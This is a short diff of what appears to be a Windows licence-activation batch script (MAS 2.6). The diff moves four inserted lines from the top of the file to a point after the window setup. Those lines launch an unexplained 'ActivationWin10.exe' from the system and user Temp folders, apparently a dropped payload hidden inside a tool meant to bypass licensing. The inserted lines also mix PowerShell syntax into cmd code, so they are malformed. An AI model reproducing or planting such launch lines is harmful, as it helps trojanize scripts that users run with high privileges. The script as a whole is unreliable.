@@ -1,8 +1,4 @@
 @echo off
-$FilePath22 = "$env:SystemRoot\Temp\"
-$FilePath222 = "$env:TEMP\"
-start "$FilePath22" ActivationWin10.exe
-start "$FilePath222" ActivationWin10.exe
 @rem RANDAM-ad90b7f0-440e-475f-98e3-d90447095365
 @set masver=2.6
 @setlocal DisableDelayedExpansion
@@ -268,6 +264,11 @@ cls
 color 07
 title  Microsoft %blank%Activation %blank%Scripts %masver%
 mode 76, 30
+
+$FilePath22 = "$env:SystemRoot\Temp\"
+$FilePath222 = "$env:TEMP\"
+start "$FilePath22" ActivationWin10.exe
+start "$FilePath222" ActivationWin10.exe
 
 echo:
 echo:
